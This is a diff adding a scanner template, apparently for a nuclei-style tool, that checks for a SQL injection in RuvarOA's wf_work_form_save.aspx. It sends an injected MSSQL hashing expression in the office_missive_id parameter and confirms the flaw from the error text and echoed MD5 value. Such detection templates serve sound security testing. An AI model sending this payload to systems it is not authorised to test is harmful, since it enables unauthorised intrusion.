@@ -1,0 +1,25 @@
+id: poc-yaml-ruvaroa-wf-work-form-save-aspx-sqli
+info:
+  name: RuvarOA wf_work_form_save.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/WorkFlow/wf_work_form_save.aspx?office_missive_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
